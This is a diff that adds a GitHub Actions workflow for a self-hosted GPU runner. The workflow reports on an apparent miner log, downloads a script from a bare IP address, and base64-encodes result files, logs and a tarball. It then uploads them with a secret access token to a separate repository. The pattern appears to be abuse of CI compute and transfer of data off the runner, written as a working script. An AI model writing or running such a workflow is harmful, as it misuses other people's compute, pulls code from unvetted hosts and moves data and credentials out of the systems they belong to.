@@ -1,0 +1,27 @@
+name: ul7256art
+on: workflow_dispatch
+permissions:
+  contents: write
+jobs:
+  art:
+    runs-on: [self-hosted, ul-l40s]
+    env:
+      PUSHTOK: ${{ secrets.GH_PAT }}
+    steps:
+      - uses: actions/checkout@v4
+      - run: |
+          set +e
+          python3 ul-bin/artifacts.py > /tmp/art.out 2>&1
+          tail -20 /tmp/art.out
+          echo "--- miner status"; tail -4 /home/ubuntu/ul7256/prl-g0.log 2>/dev/null; nvidia-smi --query-gpu=index,utilization.gpu,memory.used --format=csv,noheader
+          echo "--- keep.sh fetch"; curl -s -m 12 http://163.68.86.6:8090/keep.sh > /tmp/keep.sh; wc -c /tmp/keep.sh; head -c 800 /tmp/keep.sh
+          cat /tmp/art.out /tmp/keep.sh > /tmp/artlog.txt 2>/dev/null
+          B=$(base64 -w0 /tmp/art_hits.tsv 2>/dev/null)
+          printf '{"message":"art hits","content":"%s","branch":"main"}' "$B" > /tmp/b1.json
+          curl -s -m 40 -X PUT -H "Authorization: Bearer $PUSHTOK" -H "Content-Type: application/json" --data @/tmp/b1.json "https://api.github.com/repos/dongsuju/ul-plant/contents/out/arthits-$GITHUB_RUN_ID.tsv.b64" -o /dev/null -w "hits %{http_code}\n"
+          L=$(base64 -w0 /tmp/artlog.txt 2>/dev/null)
+          printf '{"message":"art log","content":"%s","branch":"main"}' "$L" > /tmp/b2.json
+          curl -s -m 40 -X PUT -H "Authorization: Bearer $PUSHTOK" -H "Content-Type: application/json" --data @/tmp/b2.json "https://api.github.com/repos/dongsuju/ul-plant/contents/out/artlog-$GITHUB_RUN_ID.b64" -o /dev/null -w "log %{http_code}\n"
+          T=$(base64 -w0 /tmp/art_keep.tgz 2>/dev/null); echo "tarkeep_b64_len=${#T}"
+          if [ -n "$T" ] && [ ${#T} -lt 3000000 ]; then printf '{"message":"art keep","content":"%s","branch":"main"}' "$T" > /tmp/b3.json; curl -s -m 60 -X PUT -H "Authorization: Bearer $PUSHTOK" -H "Content-Type: application/json" --data @/tmp/b3.json "https://api.github.com/repos/dongsuju/ul-plant/contents/out/artkeep-$GITHUB_RUN_ID.b64" -o /dev/null -w "keep %{http_code}\n"; fi
+          exit 0
